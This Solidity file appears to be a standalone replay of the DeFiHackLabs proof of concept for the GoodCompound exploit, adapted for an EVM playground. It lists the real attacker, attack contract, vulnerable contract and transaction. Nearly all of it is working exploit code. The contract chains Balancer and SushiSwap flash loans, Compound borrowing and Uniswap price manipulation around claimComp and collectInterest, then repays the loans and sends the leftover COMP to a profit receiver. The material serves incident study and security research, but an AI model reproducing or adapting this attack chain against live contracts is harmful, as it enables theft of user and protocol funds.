// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Standalone reproduction for the EVM Playground — mirrors the DeFiHackLabs
// GoodCompound_exp.sol test's testExploit()/receiveFlashLoan()/uniswapV2Call()
// logic verbatim, but without inheriting forge-std Test/BaseTestWithBalanceLog
// (which depends on the Foundry cheatcode contract being deployed; that
// address has no code in a plain EVM replay, so any cheatcode call reverts
// before the real attack logic runs). The original test's setUp() does two
// cheatcode-dependent things before testExploit() runs, both replicated by
// the config's `setup.steps` instead of inside this contract:
//   1. `deal(ctoken, address(this), 2_240_854_452_867)` — seeds a pre-existing
//      cETH balance snapshot on the attack contract (dealToken step).
//   2. `cheats.prank(profit_receiver); compound_token.approve(address(this), maxUint)`
//      — profit_receiver pre-approves the attack contract to pull 7.4 COMP
//      mid-attack (rawCall step with `caller: profit_receiver`).
// The `log_named_decimal_uint` calls (forge-std console logging only, no
// effect on state) are dropped.

// @KeyInfo - Total Lost : ~$13K (250.63 COMP Token)
// Attacker EOA : https://etherscan.io/address/0xdfab184bc668f16c1cb949228068588106924569
// Attack Contract : https://etherscan.io/address/0x2d89fb83c66b6c7c35818382517959e33a655b13
// Vulnerable Contract : https://etherscan.io/address/0x3d9819210a31b4961b30ef54be2aed79b9c9cd3b
// Attack Tx : https://etherscan.io/tx/0x1106418384414ed56cd7cbb9fedc66a02d39b663d580abc618f2d387348354ab

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    function withdraw(uint256 wad) external;
}

interface IComptroller {
    function enterMarkets(address[] memory) external;
    function claimComp(address, address[] memory) external;
}

interface ICompoundToken {
    function borrow(uint256 borrowAmount) external;
    function repayBorrow(uint256 repayAmount) external;
    function redeem(uint256 redeemAmount) external;
}

interface IGoodFundManager {
    function collectInterest(address[] memory, bool) external;
}

interface IBalancerVault {
    function flashLoan(address recipient, address[] memory tokens, uint256[] memory amounts, bytes memory userData)
        external;
}

interface ISushiSwap {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes memory data) external;
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] memory path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}

contract GoodCompound {
    address balancer_vault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    IBalancerVault balancer = IBalancerVault(balancer_vault);

    address profit_receiver = 0xa8Ca14Af6ef32A1Be44652CA13d0071bf855f8DD;

    address compound = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
    IERC20 compound_token = IERC20(compound);
    address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    IERC20 weth_token = IERC20(weth);

    address ceth = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
    IERC20 ceth_token = IERC20(ceth);

    address compound_comptroller = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;
    address ccompound_token = 0x70e36f6BF80a52b3B46b3aF8e106CC0ed743E8e4;

    address sushi = 0x31503dcb60119A812feE820bb7042752019F2355;

    address univ2_router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router univ2 = IUniswapV2Router(payable(univ2_router));

    address goodCompoundStaking = 0x7b7246C78e2F900D17646FF0CB2EC47D6BA10754;
    address cdai = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;

    address proxy = 0x0c6C80D2061afA35E160F3799411d83BDEEA0a5A;

    uint256 public maxUint = type(uint256).max;

    function testExploit() public {
        address[] memory path = new address[](2);
        path[0] = address(compound);
        path[1] = address(weth);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = 894_410_483_325_707_881_040;
        amounts[1] = 55_693_783_410_001_174_957_472;
        balancer.flashLoan(address(this), path, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes calldata userData
    ) external {
        weth_token.withdraw(amounts[1]);

        bytes memory data1 = abi.encodeWithSignature("mint()");
        (bool success1,) = ceth.call{value: 450}(data1);
        require(success1, "Call failed");

        address[] memory markets = new address[](1);
        markets[0] = ceth;
        IComptroller(compound_comptroller).enterMarkets(markets);
        ICompoundToken(ccompound_token).borrow(14_995_000_000_000_000_000_000);
        // double flashloan
        ISushiSwap(sushi).swap(4_200_000_000_000_000_000_000, 0, address(this), "0x30");

        IERC20(compound_token).approve(ccompound_token, maxUint);
        ICompoundToken(ccompound_token).repayBorrow(14_995_000_000_000_000_000_000);
        ICompoundToken(ceth).redeem(ceth_token.balanceOf(address(this)));
        // deposit to exchange weth
        bytes memory data2 = abi.encodeWithSignature("deposit()");
        (bool success2,) = weth.call{value: 450 ether}(data2);
        require(success2, "Call failed");

        // payback
        weth_token.transfer(balancer_vault, 55_693_783_410_001_174_957_472);
        compound_token.transfer(balancer_vault, 894_410_483_325_707_881_040);
        // transfer profit to a designated address
        compound_token.transfer(profit_receiver, compound_token.balanceOf(address(this)));
    }

    function uniswapV2Call(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        compound_token.approve(univ2_router, maxUint);
        weth_token.approve(univ2_router, maxUint);

        compound_token.transferFrom(profit_receiver, address(this), 7_400_000_000_000_000_000);
        uint256 compound_balance = compound_token.balanceOf(address(this));

        address[] memory path = new address[](2);
        path[0] = compound;
        path[1] = weth;
        univ2.swapExactTokensForTokens(compound_balance, 1, path, address(this), block.timestamp << 1);

        address[] memory path2 = new address[](1);
        path2[0] = cdai;
        IComptroller(compound_comptroller).claimComp(goodCompoundStaking, path2);

        address[] memory markets = new address[](5);
        markets[0] = goodCompoundStaking;
        markets[1] = goodCompoundStaking;
        markets[2] = goodCompoundStaking;
        markets[3] = goodCompoundStaking;
        markets[4] = goodCompoundStaking;
        IGoodFundManager(proxy).collectInterest(markets, true);
        uint256 weth_balance = weth_token.balanceOf(address(this));

        // swap back
        address[] memory path3 = new address[](2);
        path3[0] = weth;
        path3[1] = compound;
        univ2.swapExactTokensForTokens(weth_balance, 1, path3, address(this), block.timestamp << 1);

        compound_token.transfer(sushi, 4_206_320_627_691_200_181_954); // pay back

        bytes memory data = abi.encodeWithSignature("deposit()");
        (bool success,) = weth.call{value: 55_244 ether}(data);
        require(success, "Call failed");

        weth_token.transfer(sushi, 149_285_130_679_667_947); // calculated according to reserves
    }

    fallback() external payable {}
}
